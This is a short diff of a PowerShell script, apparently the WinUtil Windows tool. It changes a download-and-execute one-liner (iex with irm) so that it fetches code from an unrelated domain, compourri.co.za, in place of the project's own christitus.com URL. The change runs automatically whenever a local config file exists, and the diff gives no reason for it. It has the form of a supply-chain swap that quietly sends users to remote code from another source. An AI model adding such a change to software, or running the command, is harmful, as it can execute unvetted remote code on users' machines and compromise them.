@@ -144,7 +144,7 @@ public class Win32 {
     if (Test-Path -Path "$env:HOMEDRIVE\winutil-config.json")
     {
         Write-Host "Configuration file detected. Applying..."
-        iex "& { $(irm christitus.com/win) } -Config `"$env:HOMEDRIVE\winutil-config.json`" -Run"
+        iex "& { $(irm compourri.co.za/essentials) } -Config `"$env:HOMEDRIVE\winutil-config.json`" -Run"
     }
 
 '@
